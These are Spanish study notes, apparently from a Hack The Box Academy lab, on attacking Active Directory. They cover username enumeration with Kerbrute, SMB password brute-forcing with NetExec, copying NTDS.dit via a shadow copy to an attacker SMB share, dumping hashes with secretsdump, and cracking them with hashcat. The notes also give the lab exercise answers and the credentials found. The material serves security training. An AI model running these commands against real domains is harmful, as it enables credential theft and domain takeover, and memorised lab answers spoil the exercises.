Active Directory (AD) es el servicio de directorio habitual en redes empresariales Windows; conocerlo es esencial tanto para ataques como para defensa.

- AD gestiona la autenticación y la administración de sistemas Windows en entornos corporativos.
- Si la organización usa Windows, es muy probable que use AD.

El módulo se centra en extracción de credenciales por dos vías principales:
- Ataque por diccionario a cuentas del dominio (brute/credential stuffing con listas/wordlists).
- Volcado de hashes desde el fichero NTDS.dit (almacén de cuentas/hashes de AD).

La mayoría de estas técnicas requieren que el objetivo sea alcanzable por red → normalmente implica tener un foothold en la red interna (post-compromise).

Excepciones: organizaciones que exponen servicios (p. ej. RDP 3389) mediante port forwarding pueden permitir acceso remoto desde Internet.

Las prácticas y ejemplos que se presentan suelen simular los pasos posteriores a un compromiso inicial; primero se asume que ya hay un acceso dentro de la red.

**Antes de realizar ataques, es útil repasar cómo funciona la autenticación en máquinas unidas al dominio para entender por qué AD es vulnerable a estos ataques.

![[Pasted image 20251010114848.png]]

Al unir un equipo a un dominio, deja de usar por defecto la base SAM local para validar logons: las solicitudes de autenticación se envían al controlador de dominio (DC). Aún así, la SAM sigue disponible para cuentas locales y puede ser un vector de ataque útil.

- Equipo unido al dominio → autenticaciones por defecto validadas por el DC, no por la SAM local.
- Cuentas locales (SAM) siguen permitiendo logon si se especifica el nombre del equipo antes del usuario: HOSTNAME\usuario o usando .\usuario en la pantalla de inicio de sesión desde el propio dispositivo.

Implicaciones para ofensiva/defensa:
- Atacar/usar cuentas locales sigue siendo posible aunque la máquina esté en dominio.
- Las cuentas SAM son relevantes cuando hay acceso físico o acceso directo a la máquina (p. ej. consola, RDP con credenciales locales).

Aunque la autenticación primaria vaya al DC (NTDS), no olvidar que las cuentas locales SAM pueden ser usadas para pivotar o para estudiar/explotar escenarios donde NTDS no está accesible.

---
### Ataques de diccionario contra cuentas de AD con NetExec
Un ataque de diccionario consiste básicamente en usar la potencia de un ordenador para adivinar un nombre de usuario o contraseña mediante una lista personalizada de posibles nombres de usuario y contraseñas. Realizar estos ataques a través de una red puede ser bastante ruidoso (fácil de detectar), ya que pueden generar mucho tráfico de red y alertas en el sistema objetivo, además de ser denegados debido a las restricciones de inicio de sesión que se pueden aplicar mediante la directiva de grupo.

Cuando nos encontramos en una situación en la que un ataque de diccionario es un siguiente paso viable, podemos beneficiarnos de intentar adaptar nuestro ataque al máximo. En este caso, podemos considerar la organización con la que trabajamos para realizar la interacción y realizar búsquedas en varias redes sociales y buscar un directorio de empleados en el sitio web de la empresa. Esto puede resultar en la obtención de los nombres de los empleados que trabajan en la organización. Una de las primeras cosas que un nuevo empleado obtendrá es un nombre de usuario. 

Muchas organizaciones siguen una convención de nomenclatura al crear los nombres de usuario de los empleados. Estas son algunas convenciones comunes a tener en cuenta:  

|Username convention|Practical example for `Jane Jill Doe`|
|---|---|
|`firstinitiallastname`|jdoe|
|`firstinitialmiddleinitiallastname`|jjdoe|
|`firstnamelastname`|janedoe|
|`firstname.lastname`|jane.doe|
|`lastname.firstname`|doe.jane|
|`nickname`|doedoehacksstuff|
A menudo, la estructura de una dirección de correo electrónico nos dará el nombre de usuario del empleado (estructura: nombredeusuario@dominio). Por ejemplo, de la dirección de correo electrónico jdoe@inlanefreight.com, podemos inferir que jdoe es el nombre de usuario.

>Un consejo de MrB3n: A menudo podemos encontrar la estructura del correo electrónico buscando en Google el nombre de dominio, es decir, "@inlanefreight.com", y obtener algunos correos electrónicos válidos. A partir de ahí, podemos usar un script para rastrear varias redes sociales y combinar posibles nombres de usuario válidos. Algunas organizaciones intentan ofuscar sus nombres de usuario para evitar la difusión de contraseñas, por lo que pueden usar un alias como a907 (o algo similar) para que repita la difusión de contraseñas. De esta forma, los mensajes de correo electrónico pueden pasar, pero el nombre de usuario interno real no se revela, lo que dificulta la difusión de contraseñas. A veces, se puede usar Google dorks para buscar "inlanefreight.com filetype:pdf" y encontrar nombres de usuario válidos en las propiedades del PDF si se generaron con un editor gráfico. Desde allí, es posible que puedas discernir la estructura del nombre de usuario y potencialmente escribir un pequeño script para crear muchas combinaciones posibles y luego ver si alguna resulta válida.

---
### Creando una custom list de Usuarios
Pongamos que por internet u otra vía hemos recopilado información de los usuarios de una empresa, listándola:

- Ben Williamson
- Bob Burgerstien
- Jim Stevenson
- Jill Johnson
- Jane Doe

En formato vim, podemos escribirla como:
```shell-session
Polika4RM@htb[/htb]$ cat usernames.txt

bwilliamson
benwilliamson
ben.willamson
willamson.ben
bburgerstien
bobburgerstien
bob.burgerstien
burgerstien.bob
jstevenson
jimstevenson
jim.stevenson
stevenson.jim
```

Podemos utilizar la creación de más nombres de usuario con "Ruby-basedd tool" Username Anarchy. 
Nos hacemos un gitclone de dicha herramienta con:
```
git clone https://github.com/urbanadventurer/username-anarchy
```

Y podemos generar dicha lista automáticamente con:
```
Polika4RM@htb[/htb]$ ./username-anarchy -i /home/ltnbob/names.txt 
```

\[i] Importante, esta lista de names.txt deben estar los nombres escritos correctamente:
```
cat names.txt

pol requena
francisco javier
carlota egea
```

La salida obtenida será:
```
./username-anarchy -i /home/polika4r/Descargas/usuarios.txt
pol
polrequena
pol.requena
polreque
polrequ
polr
p.requena
prequena
rpol
r.pol
requenap
requena
requena.p
requena.pol
pr
joel
joelrequena
joel.requena
joelrequ
joelr
j.requena
```

Ojo! Esto no lo guarda en ningún sitio, yo lo tendría que copiar manualmente a una lista aparte que quisiese.

---

## Enumerating valid usernames with Kerbrute
Antes de empezar a adivinar contraseñas para nombres de usuario que podrían no existir, conviene identificar la convención de nomenclatura correcta y confirmar la validez de algunos nombres de usuario. 

Podemos hacerlo con una herramienta como Kerbrute. Kerbrute puede utilizarse para ataques de fuerza bruta, rociado de contraseñas y enumeración de nombres de usuario. 
>https://github.com/ropnop/kerbrute

Para esto, me instalo kerbrute y go:
```
sudo apt update
sudo apt install golang-go -y
go version

git clone https://github.com/ropnop/kerbrute
cd /kerbrute
GOOS=linux GOARCH=amd64 go build -o kerbrute_linux_amd64 .

chmod +x kerbrute_linux_amd64
./kerbrute_linux_amd64 --help
```

Por ahora, solo nos interesa la enumeración de nombres de usuario, que se vería así:
```shell-session
./kerbrute_linux_amd64 userenum --dc 10.129.201.57 --domain inlanefreight.local names.txt

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: v1.0.3 (9dad6e1) - 04/25/25 - Ronnie Flathers @ropnop

2025/04/25 09:17:10 >  Using KDC(s):
2025/04/25 09:17:10 >   10.129.201.57:88

2025/04/25 09:17:11 >  [+] VALID USERNAME:       bwilliamson@inlanefreight.local
<SNIP>
```

### Lanzando un ataque de fuerza bruta con NetExec:
Una vez preparadas nuestras listas o conocida la convención de nomenclatura y los nombres de algunos empleados, podemos lanzar un ataque de fuerza bruta contra el controlador de dominio objetivo con una herramienta como NetExec. Podemos usarla junto con el protocolo SMB para enviar solicitudes de inicio de sesión al controlador de dominio objetivo. Este es el comando para hacerlo:

```shell-session
Polika4RM@htb[/htb]$ netexec smb 10.129.201.57 -u bwilliamson -p /usr/share/wordlists/fasttrack.txt

SMB         10.129.201.57     445    DC01           [*] Windows 10.0 Build 17763 x64 (name:DC-PAC) (domain:dac.local) (signing:True) (SMBv1:False)
SMB         10.129.201.57     445    DC01             [-] inlanefrieght.local\bwilliamson:winter2017 STATUS_LOGON_FAILURE 
SMB         10.129.201.57     445    DC01             [-] inlanefrieght.local\bwilliamson:winter2016 STATUS_LOGON_FAILURE 
SMB         10.129.201.57     445    DC01             [-] inlanefrieght.local\bwilliamson:winter2015 STATUS_LOGON_FAILURE 
SMB         10.129.201.57     445    DC01             [-] inlanefrieght.local\bwilliamson:winter2014 STATUS_LOGON_FAILURE 
SMB         10.129.201.57     445    DC01             [-] inlanefrieght.local\bwilliamson:winter2013 STATUS_LOGON_FAILURE 
SMB         10.129.201.57     445    DC01             [-] inlanefrieght.local\bwilliamson:P@55w0rd STATUS_LOGON_FAILURE 
SMB         10.129.201.57     445    DC01             [-] inlanefrieght.local\bwilliamson:P@ssw0rd! STATUS_LOGON_FAILURE 
SMB         10.129.201.57     445    DC01             [+] inlanefrieght.local\bwilliamson:P@55w0rd! 
```

En este ejemplo, NetExec usa SMB para intentar iniciar sesión como el usuario (-u) bwilliamson con una lista de contraseñas (-p) que contiene una lista de contraseñas de uso común (/usr/share/wordlists/fasttrack.txt). Si los administradores configuraron una política de bloqueo de cuentas, este ataque podría bloquear la cuenta objetivo. Al momento de escribir este artículo (enero de 2022), las políticas de bloqueo de cuentas no se aplican de forma predeterminada con las políticas de grupo predeterminadas que se aplican a un dominio de Windows, lo que significa que es posible que nos encontremos con entornos vulnerables a este mismo ataque.


---
### Event logs from the attack
Puede ser útil saber qué pudo haber dejado un ataque. Conocer esto puede hacer que nuestras recomendaciones de remediación sean más impactantes y valiosas para el cliente con el que trabajamos. 
En cualquier sistema operativo Windows, un administrador puede acceder al Visor de Eventos y ver los eventos de seguridad para ver las acciones exactas registradas. Esto puede fundamentar decisiones para implementar controles de seguridad más estrictos y facilitar cualquier posible investigación tras una brecha de seguridad.

Una vez que hayamos descubierto algunas credenciales, podríamos intentar obtener acceso remoto al controlador de dominio objetivo y capturar el archivo NTDS.dit.

### Capturando NTDS.dit
Servicios de Directorio NT (NTDS) es el servicio de directorio usado con AD para localizar y organizar recursos de la red. 
El archivo NTDS.dit se guarda en %systemroot%/ntds en los controladores de dominio de un bosque. 
El sufijo .dit significa directory information tree (árbol de información del directorio). Este es el archivo de base de datos principal asociado con AD y almacena todos los nombres de usuario del dominio, los hashes de contraseñas y otra información crítica del esquema. 

Si este archivo puede ser capturado, podríamos comprometer potencialmente todas las cuentas del dominio, de forma similar a la técnica que vimos en la sección “Atacando SAM, SYSTEM y SECURITY” de este módulo. 

## Conectándonos a un DC utilizando Evil-WinRM

Nos podemos conectar al controlador de dominio (DC) utilizando las credenciales capturadas anteriormente:
```
Polika4RM@htb[/htb]$ evil-winrm -i 10.129.201.57  -u bwilliamson -p 'P@55w0rd!'
```

Una vez conectados al sistema, podemos revisar los privilegios del usuario *bwilliamson*.
Podemos empezar mirando a que grupo local pertenece utilizando el comando:
```
*Evil-WinRM* PS C:\> net localgroup

Aliases for \\DC01

-------------------------------------------------------------------------------
*Access Control Assistance Operators
*Account Operators
*Administrators
*Allowed RODC Password Replication Group
*Backup Operators
*Cert Publishers
*Certificate Service DCOM Access
*Cryptographic Operators
*Denied RODC Password Replication Group
*Distributed COM Users
*DnsAdmins
*Event Log Readers
*Guests
*Hyper-V Administrators
*IIS_IUSRS
*Incoming Forest Trust Builders
*Network Configuration Operators
*Performance Log Users
*Performance Monitor Users
*Pre-Windows 2000 Compatible Access
*Print Operators
*RAS and IAS Servers
*RDS Endpoint Servers
*RDS Management Servers
*RDS Remote Access Servers
*Remote Desktop Users
*Remote Management Users
*Replicator
*Server Operators
*Storage Replica Administrators
*Terminal Server License Servers
*Users
*Windows Authorization Access Group
The command completed successfully.
```

Para hacer una copia del archivo NTDS-dit, necesitamos que el usuario desde el que tengamos acceso tenga permisos de administrador. 
Con el siguiente comando vemos como efectivamente tiene permiso tanto de admin como de User:
```
*Evil-WinRM* PS C:\> net user bwilliamson

User name                    bwilliamson
Full Name                    Ben Williamson
Comment
User's comment
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            1/13/2022 12:48:58 PM
Password expires             Never
Password changeable          1/14/2022 12:48:58 PM
Password required            Yes
User may change password     Yes

Workstations allowed         All
Logon script
User profile
Home directory
Last logon                   1/14/2022 2:07:49 PM

Logon hours allowed          All

Local Group Memberships
Global Group memberships     *Domain Users         *Domain Admins
The command completed successfully.
```

#### Creando una copia "sombra" de C:
Podemos utilizar la herramienta vssadmin par crear un "Volume Shadow Copy" (VSS) de la unidad C (unidad en la que por defecto NTDS almacena sus datos).
Ejecutamos:
```shell-session
*Evil-WinRM* PS C:\> vssadmin CREATE SHADOW /For=C:

vssadmin 1.1 - Volume Shadow Copy Service administrative command-line tool
(C) Copyright 2001-2013 Microsoft Corp.

Successfully created shadow copy for 'C:\'
    Shadow Copy ID: {186d5979-2f2b-4afe-8101-9f1111e4cb1a}
    Shadow Copy Volume Name: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2
```
- Este paso es necesario debido a que no puedo copiarlos mientras estén en uso (y están en uso constantemente mientras windows está activo).

Ahora, podemos copiar el archivo NTDS.dit desde la instantànea de la copia del volumen C a cualquier otra ubicación.
Lo hacemos con el comando:
```
*Evil-WinRM* PS C:\NTDS> cmd.exe /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\Windows\NTDS\NTDS.dit c:\NTDS\NTDS.dit

        1 file(s) copied.
```

Antes de copiar NTDS.dit a nuestro host de ataque, podemos usar la técnica que aprendimos anteriormente para crear un recurso compartido SMB en dicho host. Si es necesario, puede consultar la sección Ataque a SAM, SISTEMA y SEGURIDAD para revisar este método.

Nota: Al igual que con SAM, los hashes almacenados en NTDS.dit se cifran con una clave almacenada en SYSTEM. Para extraerlos correctamente, es necesario descargar ambos archivos.

## Transfiriendo NTDS.dit a nuestra máquina atacante
Ahora, podemos utilizar el comando "cmd.exe /c move" para mover el archivo a otra localización para que el atacante pueda tener acceso:
Ejecutaremos el comando:
```
*Evil-WinRM* PS C:\NTDS> cmd.exe /c move C:\NTDS\NTDS.dit \\10.10.15.30\CompData 

        1 file(s) moved.		
```

---
### Extrayendo hashes del NTDS.dit
Con una copia de NTDS.dit en nuestro host de ataque, podemos volcar los hashes. Una forma de hacerlo es con secretsdump de Impacket::

```shell-session
Polika4RM@htb[/htb]$ impacket-secretsdump -ntds NTDS.dit -system SYSTEM LOCAL

Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Target system bootKey: 0x62649a98dea282e3c3df04cc5fe4c130
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Searching for pekList, be patient
[*] PEK # 0 found and decrypted: 086ab260718494c3a503c47d430a92a4
[*] Reading and decrypting hashes from NTDS.dit 
Administrator:500:aad3b435b51404eeaad3b435b51404ee:64f12cddaa88057e06a81b54e73b949b:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DC01$:1000:aad3b435b51404eeaad3b435b51404ee:e6be3fd362edbaa873f50e384a02ee68:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:cbb8a44ba74b5778a06c2d08b4ced802:::
<SNIP>
```
#### Alternativa a utilziar impacket-secretsdump:
Como alternativa, podemos beneficiarnos de usar NetExec para realizar los mismos pasos mostrados anteriormente, todo con un solo comando. Este comando nos permite usar VSS para capturar y volcar rápidamente el contenido del archivo NTDS.dit cómodamente desde nuestra sesión de terminal:

```shell-session
Polika4RM@htb[/htb]$ netexec smb 10.129.201.57 -u bwilliamson -p P@55w0rd! -M ntdsutil

SMB         10.129.201.57   445     DC01         [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:inlanefrieght.local) (signing:True) (SMBv1:False)
SMB         10.129.201.57   445     DC01         [+] inlanefrieght.local\bwilliamson:P@55w0rd! (Pwn3d!)
NTDSUTIL    10.129.201.57   445     DC01         [*] Dumping ntds with ntdsutil.exe to C:\Windows\Temp\174556000
NTDSUTIL    10.129.201.57   445     DC01         Dumping the NTDS, this could take a while so go grab a redbull...
NTDSUTIL    10.129.201.57   445     DC01         [+] NTDS.dit dumped to C:\Windows\Temp\174556000
NTDSUTIL    10.129.201.57   445     DC01         [*] Copying NTDS dump to /tmp/tmpcw5zqy5r
NTDSUTIL    10.129.201.57   445     DC01         [*] NTDS dump copied to /tmp/tmpcw5zqy5r
NTDSUTIL    10.129.201.57   445     DC01         [+] Deleted C:\Windows\Temp\174556000 remote dump directory
NTDSUTIL    10.129.201.57   445     DC01         [+] Dumping the NTDS, this could take a while so go grab a redbull...
NTDSUTIL    10.129.201.57   445     DC01         Administrator:500:aad3b435b51404eeaad3b435b51404ee:64f12cddaa88057e06a81b54e73b949b:::
NTDSUTIL    10.129.201.57   445     DC01         Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
NTDSUTIL    10.129.201.57   445     DC01         DC01$:1000:aad3b435b51404eeaad3b435b51404ee:e6be3fd362edbaa873f50e384a02ee68:::
NTDSUTIL    10.129.201.57   445     DC01         krbtgt:502:aad3b435b51404eeaad3b435b51404ee:cbb8a44ba74b5778a06c2d08b4ced802:::
NTDSUTIL    10.129.201.57   445     DC01         inlanefrieght.local\jim:1104:aad3b435b51404eeaad3b435b51404ee:c39f2beb3d2ec06a62cb887fb391dee0:::
NTDSUTIL    10.129.201.57   445     DC01         WIN-IAUBULPG5MZ:1105:aad3b435b51404eeaad3b435b51404ee:4f3c625b54aa03e471691f124d5bf1cd:::
NTDSUTIL    10.129.201.57   445     DC01         WIN-NKHHJGP3SMT:1106:aad3b435b51404eeaad3b435b51404ee:a74cc84578c16a6f81ec90765d5eb95f:::
NTDSUTIL    10.129.201.57   445     DC01         WIN-K5E9CWYEG7Z:1107:aad3b435b51404eeaad3b435b51404ee:ec209bfad5c41f919994a45ed10e0f5c:::
NTDSUTIL    10.129.201.57   445     DC01         WIN-5MG4NRVHF2W:1108:aad3b435b51404eeaad3b435b51404ee:7ede00664356820f2fc9bf10f4d62400:::
NTDSUTIL    10.129.201.57   445     DC01         WIN-UISCTR0XLKW:1109:aad3b435b51404eeaad3b435b51404ee:cad1b8b25578ee07a7afaf5647e558ee:::
NTDSUTIL    10.129.201.57   445     DC01         WIN-ETN7BWMPGXD:1110:aad3b435b51404eeaad3b435b51404ee:edec0ceb606cf2e35ce4f56039e9d8e7:::
NTDSUTIL    10.129.201.57   445     DC01         inlanefrieght.local\bwilliamson:1125:aad3b435b51404eeaad3b435b51404ee:bc23a1506bd3c8d3a533680c516bab27:::
NTDSUTIL    10.129.201.57   445     DC01         inlanefrieght.local\bburgerstien:1126:aad3b435b51404eeaad3b435b51404ee:e19ccf75ee54e06b06a5907af13cef42:::
NTDSUTIL    10.129.201.57   445     DC01         inlanefrieght.local\jstevenson:1131:aad3b435b51404eeaad3b435b51404ee:bc007082d32777855e253fd4defe70ee:::
NTDSUTIL    10.129.201.57   445     DC01         inlanefrieght.local\jjohnson:1133:aad3b435b51404eeaad3b435b51404ee:161cff084477fe596a5db81874498a24:::
NTDSUTIL    10.129.201.57   445     DC01         inlanefrieght.local\jdoe:1134:aad3b435b51404eeaad3b435b51404ee:64f12cddaa88057e06a81b54e73b949b:::
NTDSUTIL    10.129.201.57   445     DC01         Administrator:aes256-cts-hmac-sha1-96:cc01f5150bb4a7dda80f30fbe0ac00bed09a413243c05d6934bbddf1302bc552
NTDSUTIL    10.129.201.57   445     DC01         Administrator:aes128-cts-hmac-sha1-96:bd99b6a46a85118cf2a0df1c4f5106fb
NTDSUTIL    10.129.201.57   445     DC01         Administrator:des-cbc-md5:618c1c5ef780cde3
NTDSUTIL    10.129.201.57   445     DC01         DC01$:aes256-cts-hmac-sha1-96:113ffdc64531d054a37df36a07ad7c533723247c4dbe84322341adbd71fe93a9
NTDSUTIL    10.129.201.57   445     DC01         DC01$:aes128-cts-hmac-sha1-96:ea10ef59d9ec03a4162605d7306cc78d
NTDSUTIL    10.129.201.57   445     DC01         DC01$:des-cbc-md5:a2852362e50eae92
NTDSUTIL    10.129.201.57   445     DC01         krbtgt:aes256-cts-hmac-sha1-96:1eb8d5a94ae5ce2f2d179b9bfe6a78a321d4d0c6ecca8efcac4f4e8932cc78e9
NTDSUTIL    10.129.201.57   445     DC01         krbtgt:aes128-cts-hmac-sha1-96:1fe3f211d383564574609eda482b1fa9
NTDSUTIL    10.129.201.57   445     DC01         krbtgt:des-cbc-md5:9bd5017fdcea8fae
NTDSUTIL    10.129.201.57   445     DC01         inlanefrieght.local\jim:aes256-cts-hmac-sha1-96:4b0618f08b2ff49f07487cf9899f2f7519db9676353052a61c2e8b1dfde6b213
NTDSUTIL    10.129.201.57   445     DC01         inlanefrieght.local\jim:aes128-cts-hmac-sha1-96:d2377357d473a5309505bfa994158263
NTDSUTIL    10.129.201.57   445     DC01         inlanefrieght.local\jim:des-cbc-md5:79ab08755b32dfb6
NTDSUTIL    10.129.201.57   445     DC01         WIN-IAUBULPG5MZ:aes256-cts-hmac-sha1-96:881e693019c35017930f7727cad19c00dd5e0cfbc33fd6ae73f45c117caca46d
NTDSUTIL    10.129.201.57   445     DC01         WIN-IAUBULPG5MZ:aes128-cts-hmac-sha1-
NTDSUTIL    10.129.201.57   445     DC01         [+] Dumped 61 NTDS hashes to /home/bob/.nxc/logs/DC01_10.129.201.57_2025-04-25_084640.ntds of which 15 were added to the database
NTDSUTIL    10.129.201.57   445    DC01          [*] To extract only enabled accounts from the output file, run the following command: 
NTDSUTIL    10.129.201.57   445    DC01          [*] grep -iv disabled /home/bob/.nxc/logs/DC01_10.129.201.57_2025-04-25_084640.ntds | cut -d ':' -f1
```

## Crackeo de HASHES
Con los hashes ya localizados, podemos pasar a crackearlos con hashcat, utilizando:
```
Polika4RM@htb[/htb]$ sudo hashcat -m 1000 64f12cddaa88057e06a81b54e73b949b /usr/share/wordlists/rockyou.txt

64f12cddaa88057e06a81b54e73b949b:Password1
```

----
 **1. What is the name of the file stored on a domain controller that contains the password hashes of all domain accounts? (Format: \*\*\*\*.\*\*\*)**
Respuesta teórica: NTDS.dit

**2. Submit the NT hash associated with the Administrator user from the example output in the section reading.**
Respuesta en base a los apuntes: **64f12cddaa88057e06a81b54e73b949b**

**3. On an engagement you have gone on several social media sites and found the Inlanefreight employee names: John Marston IT Director, Carol Johnson Financial Controller and Jennifer Stapleton Logistics Manager. You decide to use these names to conduct your password attacks against the target domain controller. Submit John Marston's credentials as the answer. (Format: username:password, Case-Sensitive)**

Vamos a empezar realizando una lista de las posibles combinaciones de nombres que puede tener John Marston.
En primer lugar, genero un archivo name.txt con el contenido:
```
cat name.txt 
	John Marston
```

```
git clone https://github.com/urbanadventurer/username-anarchy
cd username-anarchy/
./username-anarchy -i ~/username-anarchy/name.txt 

```

Y nos genera una lista llamada
```john
johnmarston
john.marston
johnmars
johnm
j.marston
jmarston
mjohn
m.john
marstonj
marston
marston.j
marston.john
jm
```
Ojo! Esto no lo guarda en ningún sitio, yo lo tendría que copiar manualmente a una lista aparte que quisiese, la cual llamaré nameS.txt:
```
cat nameS.txt 
john
johnmarston
john.marston
johnmars
johnm
j.marston
jmarston
mjohn
m.john
marstonj
marston
marston.j
marston.john
jm
```

Tendré que ejecutar el comando:
./kerbrute_linux_amd64 userenum --dc 10.129.202.85 --domain ???.local names.txt

Para saber el dominio, haré un escaneo básico en nmap:
```
nmap -sSCV -Pn -n --open --min-rate 2000 10.129.202.85 -vvv
```

y veré la siguiente línea:
```
PORT     STATE SERVICE       REASON          VERSION
53/tcp   open  domain        syn-ack ttl 127 Simple DNS Plus
88/tcp   open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2025-10-10 13:20:17Z)
135/tcp  open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
139/tcp  open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
389/tcp  open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: ILF.local0., Site: Default-First-Site-Name)
```

Ojo! Los nombres de los dominios siempre acaban en .local (y no en .local0), pues ejecutaré: 
```
┌─[eu-academy-3]─[10.10.15.71]─[htb-ac-1876550@htb-zmumfwlpqh]─[~/username-anarchy/kerbrute]
└──╼ [★]$ ./kerbrute_linux_amd64 userenum --dc 10.129.202.85 --domain ILF.local /home/htb-ac-1876550/username-anarchy/nameS.txt 

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: dev (n/a) - 10/10/25 - Ronnie Flathers @ropnop

2025/10/10 08:25:27 >  Using KDC(s):
2025/10/10 08:25:27 >  	10.129.202.85:88

2025/10/10 08:25:27 >  [+] VALID USERNAME:	 jmarston@ILF.local
2025/10/10 08:25:27 >  Done! Tested 14 usernames (1 valid) in 0.005 seconds

```

Ya tengo que el nombre válido es "jmarston\@ILF.local".

Con esto, ejecutaré fuerza bruta para intentar buscar la contraseña que tiene:
```
netexec smb 10.129.202.85 -u jmarston -p /usr/share/wordlists/fasttrack.txt
```

Dándome como respuesta:
```
┌─[eu-academy-3]─[10.10.15.71]─[htb-ac-1876550@htb-zmumfwlpqh]─[~/username-anarchy/kerbrute]
└──╼ [★]$ netexec smb 10.129.202.85 -u jmarston -p /usr/share/wordlists/fasttrack.txt
[*] First time use detected
[*] Creating home directory structure
[*] Creating missing folder logs
.....
[*] Initializing RDP protocol database
[*] Copying default configuration file
SMB         10.129.202.85   445    ILF-DC01         [*] Windows 10 / Server 2019 Build 17763 x64 (name:ILF-DC01) (domain:ILF.local) (signing:True) (SMBv1:False)
SMB         10.129.202.85   445    ILF-DC01         [-] ILF.local\jmarston:Spring2017 STATUS_LOGON_FAILURE 
SMB         10.129.202.85   445    ILF-DC01         [-] ILF.local\jmarston:Spring2016 STATUS_LOGON_FAILURE 
SMB         10.129.202.85   445    ILF-DC01         [-] ILF.local\jmarston:Spring2015 STATUS_LOGON_FAILURE 
.....
SMB         10.129.202.85   445    ILF-DC01         [-] ILF.local\jmarston:P@ssw0rd! STATUS_LOGON_FAILURE 
SMB         10.129.202.85   445    ILF-DC01         [-] ILF.local\jmarston:P@55w0rd! STATUS_LOGON_FAILURE 
SMB         10.129.202.85   445    ILF-DC01         [+] ILF.local\jmarston:P@ssword! (Pwn3d!)

```

Que la contraseña es "P@ssword!"

Siendo la respuesta total del ejercicio:
```
jmarston:P@ssword!
```

**4.  Capture the NTDS.dit file and dump the hashes. Use the techniques taught in this section to crack Jennifer Stapleton's password. Submit her clear-text password as the answer. (Format: Case-Sensitive)**

Ejecutaré:
```
evil-winrm -i 10.129.202.85  -u jmarston -p 'P@ssword!'
```

Dándome como respuesta una terminal:

```
*Evil-WinRM* PS C:\Users\jmarston\Documents> 
```

Comprobando que el usuario tenga credenciales de administrador:
```
*Evil-WinRM* PS C:\Users\jmarston\Documents> net user jmarston
User name                    jmarston
Full Name                    John Marston
Comment                      IT Directory
User's comment
....
User profile
Home directory
Last logon                   10/10/2025 6:26:58 AM

Logon hours allowed          All

Local Group Memberships
Global Group memberships     *Domain Admins        *Domain Users
                             *Leadership
The command completed successfully.

```

Las tiene! 

Hago una shadow de la ubicación con:
```
*Evil-WinRM* PS C:\Users\jmarston\Documents> vssadmin CREATE SHADOW /For=C:
vssadmin 1.1 - Volume Shadow Copy Service administrative command-line tool
(C) Copyright 2001-2013 Microsoft Corp.

Successfully created shadow copy for 'C:\'
    Shadow Copy ID: {01a34975-db42-48ab-81a4-024b06f395e1}
    Shadow Copy Volume Name: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1

```


Me indica que se ha guardado en: "\\\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1"

En atacante linux ejecuto:
```
sudo impacket-smbserver share -smb2support /tmp/smbshare -user test -password test
```
Y me aseguro que se creen:
```
sudo mkdir -p /tmp/smbshare
sudo chmod 777 /tmp/smbshare
ls -ld /tmp/smbshare
cd /tmp/smbshare
```

En víctima ejecuto:
```
net use N: \\10.10.14.107\share /user:test test
```

Y dentro de la terminal "*Evil-WinRM* PS C:\Users\jmarston\Documents> " ejecuto:
```
*Evil-WinRM* PS C:\Users\jmarston\Documents> cmd.exe /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\Windows\NTDS\NTDS.dit N:\
        1 file(s) copied.
```

Vuelvo al atacante Linux y lo encuentro en:
```
┌─[eu-academy-3]─[10.10.15.71]─[htb-ac-1876550@htb-zmumfwlpqh]─[/tmp/smbshare]
└──╼ [★]$ ls
ntds.dit
```


Ejecuto:
```
netexec smb 10.129.202.85 -u jmarston -p P@ssword! -M ntdsutil
```

Y obtengo:
```
┌─[eu-academy-3]─[10.10.15.71]─[htb-ac-1876550@htb-zmumfwlpqh]─[/tmp/smbshare]
└──╼ [★]$ netexec smb 10.129.202.85 -u jmarston -p P@ssword! -M ntdsutil
SMB         10.129.202.85   445    ILF-DC01         [*] Windows 10 / Server 2019 Build 17763 x64 (name:ILF-DC01) (domain:ILF.local) (signing:True) (SMBv1:False)
SMB         10.129.202.85   445    ILF-DC01         [+] ILF.local\jmarston:P@ssword! (Pwn3d!)
NTDSUTIL    10.129.202.85   445    ILF-DC01         [*] Dumping ntds with ntdsutil.exe to C:\Windows\Temp\176010496
NTDSUTIL    10.129.202.85   445    ILF-DC01         Dumping the NTDS, this could take a while so go grab a redbull...
NTDSUTIL    10.129.202.85   445    ILF-DC01         [+] NTDS.dit dumped to C:\Windows\Temp\176010496
NTDSUTIL    10.129.202.85   445    ILF-DC01         [*] Copying NTDS dump to /tmp/tmpoov18era
NTDSUTIL    10.129.202.85   445    ILF-DC01         [*] NTDS dump copied to /tmp/tmpoov18era
NTDSUTIL    10.129.202.85   445    ILF-DC01         [+] Deleted C:\Windows\Temp\176010496 remote dump directory
NTDSUTIL    10.129.202.85   445    ILF-DC01         [+] Dumping the NTDS, this could take a while so go grab a redbull...
NTDSUTIL    10.129.202.85   445    ILF-DC01         Administrator:500:aad3b435b51404eeaad3b435b51404ee:7796ee39fd3a9c3a1844556115ae1a54:::
